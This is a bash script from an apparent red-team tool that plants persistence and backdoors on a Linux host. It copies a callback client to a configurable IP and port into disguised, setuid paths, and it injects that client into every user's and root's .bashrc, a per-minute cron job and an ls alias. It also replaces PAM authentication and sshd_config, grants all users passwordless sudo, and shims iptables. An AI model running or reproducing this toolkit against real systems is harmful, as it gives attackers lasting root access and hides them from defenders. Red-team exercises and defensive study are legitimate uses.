#!/bin/bash

#
#   TODO: Add backdoor users, Timestomping, ps + netstat binaries backdoor 
#

# Change host and port before the deployment 
host="192.168.204.128"
port="8080"


payload1="/dev/shm/pulse-shm-401862937 $host $port" 
payload2="/dev/loop17 $host $port"
payload3="/etc/vmware-tools.conf $host $port"

# Setup tools for basic deployment 
setup(){
    #yum install -y 
    apt-get install -y curl wget vim python3 openssh-server
}

# Timestomp 

# Add backdoor users 

# Clone the client binary into different places 
clone(){
    cp deploy.sh /dev/shm/pulse-shm-10175238
    cp deploy.sh /dev/loop28
    cp deploy.sh /etc/vmware-tools.conf 

    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/shm/pulse-shm-401862937
    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/loop17
    cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf

    # Clone copyman to different location 
    # Clone all the static files to /var/local, for copyman 

}

# Add bot to all the bashrc found in /home and /root 
bashrc(){
    bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
    for i in $bashrc; do
        sed -is "30 a $payload1" $i
    done

    sed -i "30 a $payload1" /root/.bashrc
}

# Need persistent alias. Right now, this doesn't do anything 
alias_ls(){
    alias ls="ls; $payload2"
}

# This might be different in centos, systemctl restart cronjob 
cronjob(){
    crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
    systemctl restart cron 
}

# Shim binaries
iptables(){
    gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o ./iptables/drop
    cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
    cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
    chmod 777 /sbin/xtables-single

    xtables=`which iptables`
    ln -sf /sbin/xtables-single $xtables
}

# PAM backdoor 
pam(){
    cp /opt/cdt-redteamtool/payload/static/common-auth /etc/pam.d/common-auth
}

# vulnerable sshd_config 
# think about ForceCommand --> iptable drop + run client 
sshd_config(){
    cp /opt/cdt-redteamtool/payload/static/sshd_config /etc/ssh/sshd_config
    systemctl restart ssh
}

# vulnerable bashrc (POG) ? 

# vulnerable sudoers
sudoers(){
    echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
}


########## Start of Main ##########

setup
clone
sshd_config
sudoers
cronjob
pam
bashrc  
iptables

# Start copyman 
